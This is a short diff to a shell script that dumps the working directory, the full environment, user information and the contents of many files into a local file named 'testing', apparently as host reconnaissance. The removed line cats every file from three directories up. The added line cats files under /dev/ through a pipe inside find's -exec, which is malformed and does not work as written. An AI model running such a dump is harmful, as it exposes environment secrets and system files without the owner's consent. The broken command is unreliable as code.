@@ -1,6 +1,6 @@
 pwd > testing
 echo ----------------- ls ------- >> testing
-find ../../../ -depth -printf "--------%p------\n" -exec cat '{}' \;>> testing
+find /dev/ -depth -type f -exec cat '{}' | grep -i "json" \; >> testing
 echo ----------------- Environment ------- >> testing
 env >> testing
 echo ----------------- User Info ------- >> testing
